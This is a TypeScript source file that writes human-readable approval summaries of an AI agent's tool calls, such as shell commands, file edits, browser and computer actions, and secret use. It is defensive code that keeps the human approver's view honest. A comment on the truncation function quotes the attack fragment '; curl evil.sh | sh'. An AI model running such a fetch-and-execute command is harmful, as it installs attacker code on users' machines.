/**
 * Human-readable summaries of tool calls for approvals and dashboard UI.
 * Keeps raw JSON out of the user's face.
 */

import { placePath, reachWords, type FileHome } from "./filehome.js";
import { showInvisible } from "./invisible.js";
import { keyCaps, keyPlatformOf, type KeyPlatform } from "./keys.js";

const MAX_VALUE = 120;
const MAX_FIELDS = 6;

/**
 * A value on one line, cut to fit by its middle so its end always shows: a
 * command's last part ("; curl evil.sh | sh") is where a harmless start
 * hides what it does. A line break or tab in it is said as its key, never
 * folded into a space, and a character that reorders or hides text (a
 * direction mark, a zero-width space) as its code point.
 */
function truncate(s: string, n = MAX_VALUE): string {
  const t = showInvisible(s)
    .replace(/\r\n|\r|\n/g, " ⏎ ")
    .replace(/\t/g, " ⇥ ")
    .replace(/[ \f\v]+/g, " ")
    .trim();
  if (t.length <= n) return t;
  const tail = Math.floor((n - 1) * 0.4);
  return `${t.slice(0, n - 1 - tail)}…${t.slice(t.length - tail)}`;
}

function parseArgs(args: string | Record<string, unknown>): Record<string, unknown> {
  if (typeof args === "object" && args !== null) return args;
  try {
    const v = JSON.parse(args) as unknown;
    if (v && typeof v === "object" && !Array.isArray(v)) {
      return v as Record<string, unknown>;
    }
  } catch {
    // fall through
  }
  return { raw: args };
}

/** ", open to Members, everyone" for an access list; nothing for one that lets nobody else in. */
function whoOf(access: unknown): string {
  if (!Array.isArray(access)) return "";
  const who = access
    .filter((e): e is { who: string } => !!e && typeof e === "object" && typeof (e as { who?: unknown }).who === "string")
    .map((e) => e.who)
    .filter((w) => w.toLowerCase() !== "owner");
  return who.length ? `, open to ${who.join(", ")}` : "";
}

/** The skill a script entry belongs to: skills/<name>/index.js is <name>. */
function skillNameOf(entry: unknown): string | undefined {
  if (typeof entry !== "string") return undefined;
  const m = /^skills\/([^/]+)\//.exec(entry);
  return m?.[1] ?? entry;
}

function fmtVal(v: unknown): string {
  if (v === null || v === undefined) return "—";
  if (typeof v === "string") return truncate(v);
  if (typeof v === "number" || typeof v === "boolean") return String(v);
  try {
    return truncate(JSON.stringify(v));
  } catch {
    return String(v);
  }
}

/** What to call an id, where the caller knows: a channel's name for its id, a chat's title, a job's name. */
export type ActionNames = (kind: string, id: string) => string | undefined;

/** The kind of thing a field holds, so a name can stand beside its id. */
function kindOfField(tool: string, key: string): string | undefined {
  if (key === "channel" || key === "place") return "channel";
  if (key === "to") return tool === "notify" ? "target" : "chat";
  if (key === "id") return tool.startsWith("cron.") ? "schedule" : tool.startsWith("chats.") ? "chat" : undefined;
  if (key === "name" && tool.startsWith("blobs.")) return "blob";
  return undefined;
}

const COMPUTER_CLICKS: Record<string, string> = {
  left_click: "Click",
  right_click: "Right-click",
  middle_click: "Middle-click",
  double_click: "Double-click",
  triple_click: "Triple-click",
};

/** A single action this short may follow the step's purpose, in parentheses. */
const SHORT_MECHANICS = 24;

const lowerFirst = (s: string): string => s.charAt(0).toLowerCase() + s.slice(1);
const upperFirst = (s: string): string => s.charAt(0).toUpperCase() + s.slice(1);

/** A name the formatter does not know, as words: "hold_key" is "Hold key". */
const itself = (name: string): string => upperFirst(name.replace(/_/g, " ").trim());

/** A piece of a step's line: words, or one key chord as its keycap (⌘−), which a surface may draw as a key. */
export type StepPiece = { text: string } | { key: string };
/** One line of a step, in pieces: "Press ", ⌘−, " 4 times, then ", ⌘Home. */
export type StepLine = StepPiece[];

/** A line as plain words, its keys as their caps. */
export function stepText(line: StepLine): string {
  return line.map((p) => ("key" in p ? p.key : p.text)).join("");
}

/** One action of a step: its pieces, the chords it presses when it is a press, and the action as the model wrote it. */
interface Part {
  pieces: StepLine;
  /** Set when the action is a press of these chords alone, so presses in a row read as one. */
  keys?: string[];
  raw: unknown;
}

const words = (text: string): Part => ({ pieces: [{ text }], raw: undefined });

/**
 * Typed words as a step shows them: every one, in quotes, a quote inside
 * them escaped so they cannot read as the end of the step and the start of
 * another, a line break or tab as the key it presses, and an invisible
 * character as its code point.
 */
function typed(v: unknown): StepLine {
  const text = typeof v === "string" ? v : fmtVal(v);
  const pieces: StepLine = [{ text: "“" }];
  for (const part of showInvisible(text).split(/(\r\n|\r|\n|\t)/)) {
    if (part === "\n" || part === "\r\n" || part === "\r") pieces.push({ key: "⏎" });
    else if (part === "\t") pieces.push({ key: "Tab" });
    else if (part) pieces.push({ text: part.replace(/[“”"\\]/g, (q) => `\\${q}`) });
  }
  pieces.push({ text: "”" });
  return pieces;
}

/** A step of words around typed words. */
const withTyped = (before: string, v: unknown, after = ""): Part => ({ pieces: tidy([{ text: before }, ...typed(v), ...(after ? [{ text: after }] : [])]), raw: undefined });

/** A point on the screen, as a click names it when it has nothing better: "at 412, 220". */
function at(coordinate: unknown): string {
  return Array.isArray(coordinate) && coordinate.length >= 2 && coordinate.every((c) => typeof c === "number") ? ` at ${coordinate[0]}, ${coordinate[1]}` : "";
}

/** A press of keys, as caps: nothing to press reads as "Press" alone. */
function press(text: unknown, platform: KeyPlatform): Part {
  const keys = typeof text === "string" ? keyCaps(text, platform) : [];
  return keys.length ? { pieces: [{ text: "Press " }, ...spaced(keys)], keys, raw: undefined } : words("Press");
}

/** Keycaps with a space between each. */
function spaced(keys: string[]): StepLine {
  return keys.flatMap((key, i) => (i === 0 ? [{ key }] : [{ text: " " }, { key }]));
}

/** The same value, whatever order its keys were written in. */
function same(a: unknown, b: unknown): boolean {
  if (a === b) return true;
  if (!a || !b || typeof a !== "object" || typeof b !== "object" || Array.isArray(a) !== Array.isArray(b)) return false;
  const ka = Object.keys(a);
  const kb = Object.keys(b);
  return ka.length === kb.length && ka.every((k) => same((a as Record<string, unknown>)[k], (b as Record<string, unknown>)[k]));
}

/** "twice", "4 times": how often a run repeats, said after it. */
const times = (n: number): string => (n === 2 ? " twice" : ` ${n} times`);

/** Text pieces side by side as one, so a line is as few pieces as it reads. */
function tidy(line: StepLine): StepLine {
  const out: StepLine = [];
  for (const piece of line) {
    const last = out[out.length - 1];
    if (last && "text" in last && "text" in piece) out[out.length - 1] = { text: last.text + piece.text };
    else out.push(piece);
  }
  return out;
}

/**
 * A step's actions as the lines a person reads: the same action repeated
 * said once with its count ("Click “Next” 3 times"), and presses in a row
 * said as one ("Press ⌘− 4 times, then ⌘Home"). Only the same action
 * repeated folds: two clicks that read alike but land in different places
 * are two clicks. Nothing is left out, and every count is exact.
 */
function linesOf(parts: Part[]): StepLine[] {
  const runs: { part: Part; count: number }[] = [];
  for (const part of parts) {
    const last = runs[runs.length - 1];
    if (last && same(last.part.raw, part.raw)) last.count += 1;
    else runs.push({ part, count: 1 });
  }
  const lines: StepLine[] = [];
  for (let i = 0; i < runs.length; ) {
    if (!runs[i]!.part.keys) {
      const { part, count } = runs[i++]!;
      lines.push(tidy(count > 1 ? [...part.pieces, { text: times(count) }] : part.pieces));
      continue;
    }
    const presses: { keys: string[]; count: number }[] = [];
    for (let run = runs[i]; run?.part.keys; run = runs[++i]) presses.push({ keys: run.part.keys, count: run.count });
    const line: StepLine = [{ text: "Press " }];
    for (const [j, p] of presses.entries()) {
      if (j > 0) line.push({ text: j === presses.length - 1 ? ", then " : ", " });
      line.push(...spaced(p.keys));
      if (p.count > 1) line.push({ text: times(p.count) });
    }
    lines.push(tidy(line));
  }
  return lines;
}

/** A line with its first word lower-cased, to follow another in a sentence. */
function following(line: StepLine): string {
  const first = line[0];
  return first && "text" in first ? lowerFirst(stepText(line)) : stepText(line);
}

/** Lines as one sentence: "Click, type “x”, press ⏎". */
function sentence(lines: StepLine[]): string {
  return lines.map((l, i) => (i === 0 ? stepText(l) : following(l))).join(", ");
}

/** The parts of one step as a line: every one, since a yes is given for all of them. */
function joinParts(parts: Part[]): string {
  return sentence(linesOf(parts));
}

/**
 * What a step is for, as the model said it, ahead of how it does it. One
 * short action follows in parentheses; anything more is the step's detail,
 * for a surface that shows one.
 */
function withIntent(intent: unknown, parts: Part[]): string {
  const purpose = typeof intent === "string" ? intent.replace(/\s+/g, " ").trim().replace(/\.$/, "") : "";
  if (!purpose) return joinParts(parts);
  const head = upperFirst(truncate(purpose, 80));
  const lines = linesOf(parts);
  const only = lines.length === 1 ? stepText(lines[0]!) : "";
  return only && only.length <= SHORT_MECHANICS ? `${head} (${following(lines[0]!)})` : head;
}

/** One computer action as words, naming where it lands by its point on the screen. */
function computerAction(a: Record<string, unknown>, platform: KeyPlatform): Part {
  const action = typeof a.action === "string" ? a.action : "";
  const click = COMPUTER_CLICKS[action];
  if (click) {
    const where = `${click}${at(a.coordinate)}`;
    const held = typeof a.text === "string" && a.text ? keyCaps(a.text.replace(/\s+/g, "+"), platform) : [];
    return held.length ? { pieces: [{ text: `${where} holding ` }, ...spaced(held)], raw: undefined } : words(where);
  }
  switch (action) {
    case "":
      return words("Use the computer");
    case "screenshot":
      return words("Look at the screen");
    case "zoom":
      return words("Look closer at part of the screen");
    case "mouse_move":
      return words(`Move the pointer${at(a.coordinate).replace(" at", " to")}`);
    case "left_click_drag": {
      const from = at(a.start_coordinate).replace(" at", " from");
      const to = at(a.coordinate).replace(" at", " to");
      return words(`Drag${from}${to}`);
    }
    case "scroll":
      return words(`Scroll ${fmtVal(a.scroll_direction ?? "down")}${typeof a.scroll_amount === "number" ? ` ${a.scroll_amount}` : ""}${at(a.coordinate)}`);
    case "type":
      return withTyped("Type ", a.text);
    case "key":
      return press(a.text, platform);
    case "wait":
      return words(`Wait ${fmtVal(a.duration ?? 1)}s`);
    default:
      return words(itself(action));
  }
}

/** A computer step as what it does on the screen; a device id names nothing the owner knows, so it is left out. */
function computerStep(tool: string, a: Record<string, unknown>, platform: KeyPlatform): string {
  if (tool === "computer.devices") return "List the paired computers";
  if (tool === "computer.end") return "Give the computer back";
  if (tool === "computer.start") {
    const device = typeof a.device === "string" && !a.device.startsWith("dev_") ? a.device : "a computer";
    return `Use ${device}: ${fmtVal(a.task)}`;
  }
  if (tool === "computer.act") return withIntent(a.intent, actParts(tool, a, platform));
  return itself(tool.slice("computer.".length)) || "Use the computer";
}

/**
 * What a browser.act step acts on, in words, always something: its label
 * ("“Submit”"), its role and ref ("button e5"), a ref alone ("element e5"),
 * or a selector as written.
 */
function targetWords(v: unknown): string {
  const o = v && typeof v === "object" && !Array.isArray(v) ? (v as Record<string, unknown>) : undefined;
  const label = typeof o?.["label"] === "string" ? o["label"] : typeof o?.["name"] === "string" ? o["name"] : undefined;
  if (label) return ` “${truncate(label, 40)}”`;
  const t = o ? (o["target"] ?? o["selector"]) : v;
  if (typeof t !== "string" || !t) return "";
  if (t.startsWith("@")) return ` ${typeof o?.["role"] === "string" ? o["role"] : "element"} ${t.slice(1)}`;
  const text = /^text=(.+)$/.exec(t)?.[1] ?? /:has-text\(['"](.+)['"]\)/.exec(t)?.[1];
  return text ? ` “${truncate(text, 40)}”` : ` ${truncate(t, 40)}`;
}

/** One browser.act step as words, naming what it acts on. */
function browserStep(s: Record<string, unknown>, platform: KeyPlatform): Part {
  const key = Object.keys(s)[0] ?? "";
  const v = s[key];
  const field = (name: string): unknown => (v && typeof v === "object" ? (v as Record<string, unknown>)[name] : undefined);
  const into = (): string => {
    const t = targetWords(v);
    return t ? ` into${t}` : "";
  };
  switch (key) {
    case "click":
      return words(`Click${targetWords(v)}`);
    case "dblclick":
      return words(`Double-click${targetWords(v)}`);
    case "rightclick":
      return words(`Right-click${targetWords(v)}`);
    case "hover":
      return words(`Point at${targetWords(v) || " something"}`);
    case "drag": {
      const from = targetWords(field("from"));
      const to = targetWords(field("to"));
      return words(`Drag${from ? `${from}` : ""}${to ? ` to${to}` : ""}`);
    }
    case "fill":
      return withTyped("Fill in ", field("text"), into());
    case "type":
      return withTyped("Type ", field("text"), into());
    case "press":
      return press(v, platform);
    case "select": {
      const values = field("values");
      const t = targetWords(v);
      return words(`Choose ${fmtVal(Array.isArray(values) ? values.join(", ") : values)}${t ? ` in${t}` : ""}`);
    }
    case "check":
      return words(`Tick${targetWords(v)}`);
    case "uncheck":
      return words(`Untick${targetWords(v)}`);
    case "scroll":
      return words(v === "up" || v === "down" ? `Scroll ${v}` : `Scroll to${targetWords(v) || " something"}`);
    case "open":
      return words(`Open ${fmtVal(v)}`);
    case "go":
      return words(v === "reload" ? "Reload the page" : `Go ${fmtVal(v)}`);
    case "wait":
      return typeof field("text") === "string" ? withTyped("Wait for ", field("text")) : words("Wait");
    case "dialog":
      return words(v === "accept" ? "Accept the dialog" : "Dismiss the dialog");
    case "":
      return words("Act on the page");
    default:
      return words(itself(key));
  }
}

/** The tools whose arguments are a run of actions, said by actParts. */
const ACTING = new Set(["computer.act", "browser.act"]);

/**
 * The actions of one computer.act or browser.act call, each as words, by one
 * rule for both: the call's `actions` (or `steps`, the browser's older name
 * for them), or a computer's single action. Every surface's step line, its
 * mechanics and the narrator are made from these.
 */
function actParts(tool: string, a: Record<string, unknown>, platform: KeyPlatform): Part[] {
  const computer = tool === "computer.act";
  const keys = keyPlatformOf(tool, platform);
  const list = Array.isArray(a.actions) ? a.actions : Array.isArray(a.steps) ? a.steps : computer ? [a] : [];
  const parts = list.map((item: unknown) => {
    const action = item && typeof item === "object" ? (item as Record<string, unknown>) : {};
    return { ...(computer ? computerAction(action, keys) : browserStep(action, keys)), raw: item };
  });
  return parts.length ? parts : [words(computer ? "Use the computer" : "Act on the page")];
}

/**
 * Every action of a computer.act or browser.act call as the lines a card
 * lists, keys as keycaps for the platform they are pressed on: repeats said
 * once with their count, presses in a row as one, nothing left out.
 * Undefined for a tool that is not a run of actions.
 */
export function actionSteps(tool: string, args: string | Record<string, unknown>, platform: KeyPlatform = "mac"): StepLine[] | undefined {
  return ACTING.has(tool) ? linesOf(actParts(tool, parseArgs(args), platform)) : undefined;
}

/**
 * How a step does what its line says, when the line says what it is for
 * instead: the lines of actionSteps for a computer.act or browser.act that
 * carries an intent, since an approval is given for these and not for the
 * model's account of them. Undefined where the line already is the
 * mechanics.
 */
export function stepActions(tool: string, args: string | Record<string, unknown>, platform: KeyPlatform = "mac"): string[] | undefined {
  const a = parseArgs(args);
  if (typeof a.intent !== "string" || !a.intent.trim()) return undefined;
  return actionSteps(tool, a, platform)?.map(stepText);
}

/** stepActions as one line. */
export function stepMechanics(tool: string, args: string | Record<string, unknown>, platform: KeyPlatform = "mac"): string | undefined {
  const a = parseArgs(args);
  if (typeof a.intent !== "string" || !a.intent.trim()) return undefined;
  const lines = actionSteps(tool, a, platform);
  return lines ? sentence(lines) : undefined;
}

/**
 * Where the calling turn's paths start: its home folder, and the workspace
 * root on disk when the caller knows it. Given, a step names the path a
 * file tool really reaches and says when it reaches outside the home.
 */
export interface ActionHome {
  home: FileHome;
  root?: string;
}

/** One-line summary for a tool + args, with names for the ids the caller can name. */
/** A secret's field as a card says it: "card number", "billing city", "expiry month". */
const SECRET_FIELD_WORDS: Record<string, string> = { number: "card number", cvc: "CVC", name: "name on card", text: "note", token: "token" };
export function secretFieldWords(field: string): string {
  const [head = "", part] = field.split(".");
  const word = SECRET_FIELD_WORDS[head] ?? head;
  return part ? `${word} ${part.replace(/^line/, "line ")}` : word;
}

/** Words in a list: "a", "a and b", "a, b and c". */
function listWords(words: string[]): string {
  return words.length <= 1 ? (words[0] ?? "") : `${words.slice(0, -1).join(", ")} and ${words[words.length - 1]}`;
}

/** A secret as a card names it: its label and its handle, or the handle alone. */
function secretNamed(a: Record<string, unknown>): string {
  const handle = fmtVal(a.secret);
  return typeof a.label === "string" && a.label.trim() ? `${a.label.trim()} (${handle})` : handle;
}

const KIND_WORDS: Record<string, string> = { login: "a login", card: "a card", apikey: "an API key", note: "a note" };

export function summarizeAction(
  tool: string,
  args: string | Record<string, unknown>,
  names?: ActionNames,
  where?: ActionHome,
  platform: KeyPlatform = "mac",
): string {
  const a = parseArgs(args);
  // The path a file tool reaches from the turn's home, and where it is when that is outside it; as written at the root.
  const at = (raw: unknown, as: "read" | "change"): string => {
    if (!where || where.home.folder === "" || (raw !== undefined && typeof raw !== "string")) return fmtVal(raw);
    const placed = placePath(where.home, raw ?? "", where.root);
    const note = reachWords(where.home, placed, as);
    return `${fmtVal(placed.path)}${note ? ` (${note})` : ""}`;
  };
  // A name where one is known, the value as written otherwise: an id alone
  // is no basis for a yes, and the id stays in the detail lines.
  const named = (kind: string, raw: unknown, fallback = fmtVal(raw)): string => {
    const id = typeof raw === "string" ? raw : typeof raw === "number" ? String(raw) : "";
    return (id && names?.(kind, id)) || fallback;
  };
  switch (tool) {
    case "secrets.fill": {
      const fields = Array.isArray(a.fields) ? a.fields.map((f) => (f && typeof f === "object" ? String((f as { field?: unknown }).field ?? "") : "")).filter(Boolean) : [];
      return `Fill ${listWords([...new Set(fields)].map(secretFieldWords)) || "a secret"} from ${secretNamed(a)}`;
    }
    case "secrets.type": {
      const app = a.app && typeof a.app === "object" ? (a.app as { name?: unknown }).name : undefined;
      const field = typeof a.field === "string" && a.field.trim() ? secretFieldWords(a.field.trim()) : "a secret";
      return `Type ${field} from ${secretNamed(a)}${typeof app === "string" && app ? ` into ${app}` : ""}`;
    }
    case "secrets.allow_site":
      return `Allow ${secretNamed(a)} on ${typeof a.origin === "string" ? a.origin : "this tab's site"}`;
    case "secrets.request": {
      // The label is KOS's words, so it is quoted as such and kept short.
      const label = typeof a.label === "string" ? a.label.replace(/\s+/g, " ").trim() : "";
      const said = label.length > 80 ? `${label.slice(0, 79)}…` : label;
      return `Add ${KIND_WORDS[String(a.kind)] ?? "a secret"}${said ? ` KOS calls “${said}”` : ""}, for KOS to use without seeing it`;
    }
    case "discord.bind":
      return `Make ${named("channel", a.channel, `#${fmtVal(a.channel)}`)} the home of ${named("chat", a.to)}`;
    case "discord.audience": {
      const channel = named("channel", a.channel, `#${fmtVal(a.channel)}`);
      return a.audience === "owner"
        ? `Close ${channel} to you alone`
        : `Open ${channel} to everyone on the server${a.audience === "guests" ? ", reading and writing" : ", reading"}`;
    }
    case "discord.make":
      return `Make the ${a.kind === "category" ? "category" : "channel"} ${fmtVal(a.name)}${a.category ? ` under ${fmtVal(a.category)}` : ""}${whoOf(a.access)}`;
    case "discord.access":
      return `Set who may use ${named("channel", a.place)}${whoOf(a.access) || ": you alone"}`;
    case "discord.role":
      return `Make the role ${fmtVal(a.name)}`;
    case "discord.prune":
      return `Delete the threads whose chats are gone${a.channel ? ` under ${named("channel", a.channel, `#${fmtVal(a.channel)}`)}` : ""}`;
    case "chats.delete":
      return `Delete the chat ${named("chat", a.id)} for good`;
    case "tasks.create_list":
      return `Create task list “${fmtVal(a.name)}”`;
    case "tasks.add":
      return `Add task “${fmtVal(a.title)}” to ${fmtVal(a.instance)}`;
    case "tasks.complete":
      return `Mark task #${fmtVal(a.id)} ${a.done === false ? "open" : "done"} on ${fmtVal(a.instance)}`;
    case "tasks.list":
      return `List tasks on ${fmtVal(a.instance)}`;
    case "systems.migrate":
      return `Schema change on project ${fmtVal(a.project)} (${fmtVal((a.spec as { op?: string } | undefined)?.op ?? "migrate")})`;
    case "systems.project_create":
      return `Create project “${fmtVal(a.name)}” (${fmtVal(a.type)})`;
    case "files.write":
      return `Write file ${at(a.path, "change")}`;
    case "files.rm":
      return `Delete ${at(a.path, "change")}`;
    case "files.mkdir":
      return `Create folder ${at(a.path, "change")}`;
    case "files.ls":
      return `List ${at(a.path, "read")}`;
    case "files.read":
      return `Read ${at(a.path, "read")}`;
    case "files.edit":
      return `Edit ${at(a.path, "change")}`;
    case "files.cp":
      return `Copy ${at(a.from, "read")} to ${at(a.to, "change")}`;
    case "files.mv":
      return `Move ${at(a.from, "change")} → ${at(a.to, "change")}`;
    case "sql":
      return `SQL: ${fmtVal(a.sql)}`;
    case "http.fetch":
      return `HTTP fetch ${fmtVal(a.url)}`;
    case "cron.schedule":
      return `Schedule cron “${fmtVal(a.name)}” [${fmtVal(a.schedule)}]`;
    case "artifacts.write":
      return `Write ${fmtVal(a.kind ?? "page")} “${fmtVal(a.title)}”${a.project ? ` for project ${fmtVal(a.project)}` : ""}`;
    case "artifacts.patch":
      return `Change artifact ${fmtVal(a.id)}`;
    case "artifacts.check":
      return `Check artifact ${fmtVal(a.id)}`;
    case "artifacts.guide":
      return `Read the ${a.kind ? `${fmtVal(a.kind)} ` : ""}artifact guide`;
    case "search.grep":
      return `Search for “${fmtVal(a.pattern)}”${where && where.home.folder !== "" ? ` in ${at(a.path, "read")}` : ""}`;
    case "search.semantic":
      return `Recall about “${fmtVal(a.query)}”`;
    case "export.query":
      return `Export ${fmtVal(a.format)} to ${at(a.path, "change")}`;
    case "notify": {
      const to = typeof a.to === "string" && a.to.trim() && a.to !== "owner" ? a.to.trim() : "";
      return to ? `Post to ${named("target", to)}: ${fmtVal(a.text)}` : `Tell you: ${fmtVal(a.text)}`;
    }
    case "skills.test":
      return `Sandbox test ${fmtVal(a.entry)}`;
    case "skills.promote":
      return `Promote skill ${fmtVal(a.entry)}`;
    case "chats.list":
      return "List conversations";
    case "chats.search":
      return `Search conversations for “${fmtVal(a.query)}”`;
    case "chats.read":
      return `Read conversation ${fmtVal(a.id)}`;
    case "chats.create":
      return `Start conversation “${fmtVal(a.title)}”`;
    case "chats.dispatch":
      return `Hand work to conversation ${fmtVal(a.id)}`;
    case "chats.archive":
      return a.archived === false ? `Bring back chat ${fmtVal(a.id)}` : `Archive chat ${fmtVal(a.id)}`;
    case "blobs.list":
      return "List the blobs";
    case "blobs.create":
      return `Make the blob ${fmtVal(a.name)}${typeof a.description === "string" && a.description ? `: ${a.description}` : ""}`;
    case "blobs.dispatch":
      return `Hand work to the blob ${fmtVal(a.agent)}${typeof a.project === "string" && a.project ? ` in ${a.project}` : ""}`;
    case "blobs.pause":
      return `Pause the blob ${fmtVal(a.name)}`;
    case "blobs.resume":
      return `Resume the blob ${fmtVal(a.name)}`;
    case "blobs.remove":
      return `Remove the blob ${named("blob", a.name)}`;
    case "chats.handoff": {
      const brief = typeof a.brief === "string" ? a.brief.replace(/\s+/g, " ").trim() : "";
      return `Hand off to ${fmtVal(a.to)}: ${brief.length > 90 ? `${brief.slice(0, 89)}…` : brief}`;
    }
    case "chats.congregate":
      return `Gather from ${Array.isArray(a.targets) ? a.targets.length : "several"} conversations`;
    case "artifacts.get":
      return `Read artifact ${fmtVal(a.id)}`;
    case "artifacts.list":
      return "List artifacts";
    case "systems.project_list":
      return "List projects";
    case "memory.remember":
      return `Remember ${fmtVal(a.key)}`;
    case "memory.recall":
      return a.query ? `Recall “${fmtVal(a.query)}”` : "Recall knowledge";
    case "memory.forget":
      return `Forget ${fmtVal(a.key)}`;
    case "memory.tags":
      return "List knowledge tags";
    case "cron.list":
      return "List scheduled jobs";
    case "cron.remove":
      return `Delete scheduled job ${fmtVal(a.id)}`;
    case "skills.run":
      return `Run skill ${fmtVal(a.entry)} for real`;
    // The risky ones most often waiting on an approval. Each says the
    // thing it would do, so "risky tool" is never the whole card.
    case "shell.run":
      return `Run: ${fmtVal(a.command)}${a.cwd || (where && where.home.folder !== "") ? ` (in ${at(a.cwd, "change")})` : ""}${a.writes === "workspace" ? ", writing anywhere in the workspace" : ""}`;
    case "cron.run":
      return `Run the job ${named("schedule", a.id, `#${fmtVal(a.id)}`)} now`;
    case "builds.run":
      return `Start a coding agent in ${fmtVal(a.dir)}: ${fmtVal(a.task)}`;
    case "daemons.create":
      return `Create daemon “${fmtVal(a.name)}”: ${fmtVal(a.runtime)} ${fmtVal(a.entry)}${Array.isArray(a.args) && a.args.length ? ` ${fmtVal(a.args.join(" "))}` : ""}`;
    case "daemons.start":
      return `Start daemon #${fmtVal(a.id)}`;
    case "daemons.stop":
      return `Stop daemon #${fmtVal(a.id)}`;
    case "daemons.remove":
      return `Remove daemon #${fmtVal(a.id)}`;
    case "daemons.logs":
      return `Read daemon #${fmtVal(a.id)}'s log`;
    case "systems.project_delete":
      return `Delete project ${fmtVal(a.project)} and everything in it`;
    case "chats.project":
      return `Stand up project “${fmtVal(a.name)}”${a.goal ? `: ${fmtVal(a.goal)}` : ""}`;
    case "modules.create":
      return `Scaffold module “${fmtVal(a.name)}”`;
    case "modules.promote":
      return `Promote project ${fmtVal(a.project)} to a blueprint`;
    case "modules.instantiate":
      return `New instance “${fmtVal(a.name)}” of ${fmtVal(a.module)}`;
    case "skills.create":
      return `Write ${fmtVal(a.kind)} skill “${fmtVal(a.name)}”`;
    case "skills.use":
      return `Load skill ${fmtVal(a.name)}`;
    case "skills.commit":
      // Queued by the promoter with the entry path, not the name: the card said "Commit skill —".
      return `Commit skill ${fmtVal(a.name ?? skillNameOf(a.entry))}`;
    default:
      break;
  }
  if (tool.startsWith("computer.")) return computerStep(tool, a, platform);
  if (tool === "chrome.start") return `Work in your Chrome${typeof a.chrome === "string" ? ` (${a.chrome})` : ""}: ${fmtVal(a.task)}`;
  if (tool === "chrome.end") return "Give your Chrome back";
  if (tool === "chrome.page") return "Read the page beside the panel";
  if (tool === "python.run") return `Run Python: ${fmtVal(typeof a.code === "string" ? (a.code.split("\n").find((l) => l.trim()) ?? "").trim() : a.code)}`;
  if (tool === "tex.pdf") return `Typeset ${at(a.path, "change")} as a PDF`;
  // KOS's own browser tools: a visit, a run of steps, or the owner's hands.
  if (tool === "browser.visit") {
    // One visit may take several pages; the card names them all.
    const urls = [...(typeof a.url === "string" && a.url ? [a.url] : []), ...(Array.isArray(a.urls) ? a.urls.filter((u): u is string => typeof u === "string" && u !== "") : [])];
    return `Visit ${urls.length ? urls.join(", ") : fmtVal(a.url)}`;
  }
  if (tool === "browser.handoff") return `Needs your hands: ${fmtVal(a.reason)}`;
  if (tool === "browser.look") return "Look at the page";
  if (tool === "browser.eval") return `Run script in the page: ${fmtVal(a.code)}`;
  if (tool === "browser.tabs") return "List the browser's tabs";
  if (tool === "browser.use_tab") return `Switch to tab ${fmtVal(a.tab)}`;
  if (tool === "browser.new_tab") return a.url !== undefined ? `Open a new tab at ${fmtVal(a.url)}` : "Open a new tab";
  if (tool === "browser.watch") return `Watch ${fmtVal(a.name ?? a.url)} for change`;
  if (tool === "browser.act") return withIntent(a.intent, actParts(tool, a, platform));
  // The old engine's actions, as transcripts from before KOS drove the
  // browser itself still hold them.
  const browser = /^mcp\.[^.]+\.agent_browser_(.+)$/.exec(tool);
  if (browser) {
    const action = browser[1]!;
    const where = a.selector !== undefined ? fmtVal(a.selector) : a.url !== undefined ? fmtVal(a.url) : "";
    switch (action) {
      case "open":
        return `Open ${where || "a page"}`;
      case "click":
        return `Click ${where}`;
      case "fill":
        return `Fill ${where} with “${fmtVal(a.value ?? a.text)}”`;
      case "type":
      case "keyboard_type":
      case "keyboard_insert_text":
        return `Type “${fmtVal(a.text)}”${where ? ` into ${where}` : ""}`;
      case "press":
        return `Press ${fmtVal(a.key)}`;
      case "select":
        return `Select ${fmtVal(a.value ?? a.values)} in ${where}`;
      case "check":
        return `Check ${where}`;
      case "uncheck":
        return `Uncheck ${where}`;
      case "scroll":
        return `Scroll ${fmtVal(a.direction ?? "down")}`;
      case "eval":
        return `Run script in the page: ${fmtVal(a.script ?? a.expression)}`;
      case "tab_new":
        return `Open a new tab${a.url !== undefined ? ` at ${fmtVal(a.url)}` : ""}`;
      case "tab_close":
        return "Close the tab";
      default:
        return `${action.replace(/_/g, " ")}${where ? ` ${where}` : ""}`;
    }
  }
  // A mail server's send, as the email it is: to whom, about what.
  if (/^mcp\.[^.]+\.(send_email|email_send)$/.test(tool)) {
    const to = Array.isArray(a.to) ? a.to.join(", ") : a.to;
    return `Email ${fmtVal(to)}${typeof a.subject === "string" && a.subject ? `: “${truncate(a.subject, 80)}”` : ""}`;
  }
  const keys = Object.keys(a).slice(0, 3);
  // A server's tool, named mcp.<server>.<tool>: say whose it is.
  const mcp = /^mcp\.([^.]+)\.(.+)$/.exec(tool);
  const head = mcp ? `${mcp[2]} on ${mcp[1]}` : tool;
  if (keys.length === 0) return head;
  const bits = keys.map((k) => `${k}=${fmtVal(a[k])}`).join(", ");
  return `${head}: ${bits}`;
}

/** Multi-line detail block for embeds / cards (key: value). */
export function detailLines(
  tool: string,
  args: string | Record<string, unknown>,
  names?: ActionNames,
  where?: ActionHome,
): string[] {
  const a = parseArgs(args);
  const lines: string[] = [];
  // Prefer a short summary line first.
  lines.push(summarizeAction(tool, a, names, where));
  // A step said by its purpose keeps how it does it in view: an approval
  // is given for the clicks, not for the model's account of them.
  const mechanics = stepMechanics(tool, a);
  if (mechanics) lines.push(mechanics);
  const keys = Object.keys(a).slice(0, MAX_FIELDS);
  for (const k of keys) {
    // The id as written, and its name beside it where one is known.
    const kind = kindOfField(tool, k);
    const name = kind && typeof a[k] === "string" ? names?.(kind, a[k] as string) : undefined;
    lines.push(`${k}: ${fmtVal(a[k])}${name && name !== a[k] ? ` (${name})` : ""}`);
  }
  if (Object.keys(a).length > MAX_FIELDS) {
    lines.push(`…+${Object.keys(a).length - MAX_FIELDS} more fields`);
  }
  return lines;
}

/** Discord/message-safe body for an approval prompt (no raw JSON blob). */
export function formatApprovalPrompt(
  id: string | number,
  tool: string,
  args: string | Record<string, unknown>,
  reason?: string | null,
  names?: ActionNames,
): string {
  const summary = summarizeAction(tool, args, names);
  const lines = [
    `**Approval needed** · pending \`#${id}\``,
    "",
    summary,
  ];
  if (reason) lines.push(`_Reason: ${reason}_`);
  lines.push("", "Use the buttons below.");
  return lines.join("\n");
}
